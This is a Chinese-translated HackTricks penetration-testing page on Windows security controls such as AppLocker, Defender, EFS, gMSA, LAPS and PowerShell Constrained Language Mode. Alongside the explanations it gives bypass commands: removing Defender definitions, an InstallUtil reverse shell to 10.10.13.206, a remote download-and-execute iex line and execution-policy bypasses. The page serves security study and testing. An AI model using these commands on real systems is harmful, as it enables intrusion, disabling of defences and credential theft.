# Windows安全控制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker策略

应用程序白名单是一份批准的软件应用程序或可执行文件列表，允许其存在和运行在系统上。其目标是保护环境免受有害的恶意软件和未经批准的与组织特定业务需求不符的软件。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)是微软的**应用程序白名单解决方案**，它使系统管理员能够控制**用户可以运行的应用程序和文件**。它提供对可执行文件、脚本、Windows安装程序文件、DLL、打包应用程序和打包应用程序安装程序的**细粒度控制**。\
组织通常会**阻止cmd.exe和PowerShell.exe**以及对某些目录的写访问，**但这些都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
应用于主机的AppLocker规则也可以从本地注册表中的`HKLM\Software\Policies\Microsoft\Windows\SrpV2`读取。

### 绕过

* 绕过AppLocker策略的有用**可写文件夹**：如果AppLocker允许在`C:\Windows\System32`或`C:\Windows`中执行任何内容，则有一些**可写文件夹**可用于**绕过此限制**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 常见的**受信任的**[**"LOLBAS's"**](https://lolbas-project.github.io/)二进制文件也可以用来绕过AppLocker。
* **编写不良的规则也可能被绕过**。
* 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个名为`allowed`的文件夹，它将被允许。
* 组织通常也会专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忽略了**其他**[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)，如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
* 由于它可能对系统造成额外负载并需要进行大量测试以确保不会出现问题，**很少启用DLL强制执行**。因此，使用**DLL作为后门将有助于绕过AppLocker**。
* 您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)在任何进程中执行PowerShell代码并绕过AppLocker。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## 凭据存储

### 安全账户管理器（SAM）

本地凭据存储在此文件中，密码已经进行了哈希处理。

### 本地安全机构（LSA）- LSASS

为了实现单点登录，**凭据**（经过哈希处理）存储在此子系统的内存中。\
**LSA**管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**等。\
LSA将检查提供的凭据是否存在于SAM文件中（用于本地登录），并与域控制器进行身份验证。

**凭据**存储在**LSASS进程**中：Kerberos票据、NT和LM哈希、易于解密的密码。

### LSA秘密

LSA可能会将某些凭据保存在磁盘上：

* Active Directory计算机帐户的密码（无法访问的域控制器）。
* Windows服务帐户的密码
* 计划任务的密码
* 更多（IIS应用程序的密码...）

### NTDS.dit

这是Active Directory的数据库。它仅存在于域控制器中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是一款可用于Windows 10、Windows 11和Windows Server版本的防病毒软件。它会**阻止**常见的渗透测试工具，如**`WinPEAS`**。然而，有办法**绕过这些保护措施**。

### 检查

要检查**Defender**的状态，可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否已激活）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

要枚举它，您还可以运行：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS（加密文件系统）

EFS通过使用一个批量的**对称密钥**（也称为文件加密密钥或**FEK**）对文件进行加密。然后，FEK使用与加密文件的用户相关联的**公钥**进行**加密**，并将加密的FEK存储在加密文件的$EFS **备用数据流**中。要解密文件，EFS组件驱动程序使用与EFS数字证书（用于加密文件）匹配的**私钥**来解密存储在$EFS流中的对称密钥。来源：[这里](https://en.wikipedia.org/wiki/Encrypting\_File\_System)。

以下是未经用户请求解密的文件示例：

- 在将文件和文件夹复制到使用其他文件系统（如[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)）格式化的卷之前，文件和文件夹将被解密。
- 使用SMB/CIFS协议通过网络复制加密文件时，文件在发送到网络之前将被解密。

使用此方法加密的文件可以被**所有者用户透明地访问**（即加密文件的用户），因此如果您能**成为该用户**，则可以解密文件（更改用户的密码并登录为该用户将不起作用）。

### 检查EFS信息

检查**用户**是否使用了此**服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用`cipher /c \<file>`检查**谁**有**访问**文件的权限。
您还可以在文件夹中使用`cipher /e`和`cipher /d`来**加密**和**解密**所有文件。

### 解密EFS文件

#### 成为Authority System

这种方法需要**受害用户**在主机上**运行**一个**进程**。如果是这种情况，使用`meterpreter`会话，您可以模拟用户进程的令牌（使用`incognito`中的`impersonate_token`命令）。或者您可以直接`migrate`到用户的进程。

#### 知道用户的密码

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## 群组管理服务帐户（gMSA）

在大多数基础架构中，服务帐户是具有“**密码永不过期**”选项的典型用户帐户。维护这些帐户可能会非常混乱，这就是为什么Microsoft引入了**管理服务帐户**的原因：

- 不再需要密码管理。它使用一个复杂、随机的240个字符的密码，并在达到域或计算机密码过期日期时自动更改密码。
- 它使用Microsoft密钥分发服务（KDC）来创建和管理gMSA的密码。
- 它不能被锁定或用于交互式登录。
- 支持在多个主机之间共享。
- 可以用于运行计划任务（管理服务帐户不支持运行计划任务）。
- 简化的SPN管理-如果计算机的**sAMaccount**详细信息或DNS名称属性发生更改，系统将自动更改SPN值。

gMSA帐户的密码存储在一个名为_**msDS-ManagedPassword**_的LDAP属性中，这些密码每30天由DC自动重置，可以被**授权管理员**和安装在其上的**服务器**检索。_**msDS-ManagedPassword**_是一个加密的数据块，称为[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只有在连接被安全保护（使用LDAPS）或身份验证类型为“封装和安全”时才能检索。

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

因此，如果正在使用gMSA，请查找它是否具有**特殊权限**，并检查您是否有**权限**读取服务的密码。

您可以使用[GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)来读取此密码：
```
/GMSAPasswordReader --AccountName jkohler
```
此外，查看这个[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行**NTLM中继攻击**以**读取**gMSA的**密码**。

## LAPS

\*\*\*\*[**本地管理员密码解决方案（LAPS）**](https://www.microsoft.com/en-us/download/details.aspx?id=46899)允许您在加入域的计算机上**管理本地管理员密码**（这些密码是**随机的**、**唯一的**，并且**定期更改**）。这些密码被集中存储在Active Directory中，并通过ACLs限制为授权用户。如果您的用户被赋予足够的权限，您可能能够读取本地管理员的密码。

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PowerShell受限语言模式

PowerShell的\*\*\*\*[**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)会**限制使用PowerShell的许多功能**，例如阻止COM对象、仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。

### **检查**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过

Bypassing refers to the act of circumventing or evading security measures in order to gain unauthorized access or privileges. In the context of Windows hardening, bypassing typically involves finding vulnerabilities or weaknesses in authentication, credentials, User Account Control (UAC), and Encrypting File System (EFS) to bypass security controls and gain elevated privileges or access to sensitive information.

绕过指的是绕过或逃避安全措施，以获取未经授权的访问或特权。在Windows加固的背景下，绕过通常涉及查找身份验证、凭据、用户帐户控制（UAC）和加密文件系统（EFS）中的漏洞或弱点，以绕过安全控制，获得提升的特权或对敏感信息的访问。
```powershell
#Easy bypass
Powershell -version 2
```
在当前的Windows系统中，绕过操作将不起作用，但您可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。

**要编译它，您可能需要** **添加一个引用** -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为 .Net4.5**。

#### 直接绕过：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 反向 shell:

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

反向 shell 是一种 shell，其中目标机器发起与攻击者机器的连接。这使得攻击者能够远程访问目标机器并执行命令。反向 shell 在后渗透场景中常用于维持对被入侵系统的持久访问。
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)在任何进程中执行Powershell代码并绕过受限模式。了解更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## PS执行策略

默认情况下，它被设置为**restricted**。绕过此策略的主要方法有：
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
更多内容可以在[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)找到

## 安全支持提供程序接口（SSPI）

是用于认证用户的API。

SSPI负责找到两台想要通信的机器的适当协议。首选的方法是Kerberos。然后，SSPI将协商使用哪种认证协议，这些认证协议称为安全支持提供程序（SSP），以DLL的形式位于每台Windows机器中，两台机器必须支持相同的协议才能进行通信。

### 主要的SSP

* **Kerberos**：首选的协议
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1**和**NTLMv2**：兼容性原因
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**：Web服务器和LDAP，密码以MD5哈希的形式
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**：SSL和TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**：用于协商要使用的协议（Kerberos或NTLM，其中Kerberos是默认协议）
* %windir%\Windows\System32\lsasrv.dll

#### 协商可以提供多种方法或仅提供一种方法。

## UAC - 用户帐户控制

[用户帐户控制（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)是一种启用**提升活动的同意提示**的功能。

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，由全球**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
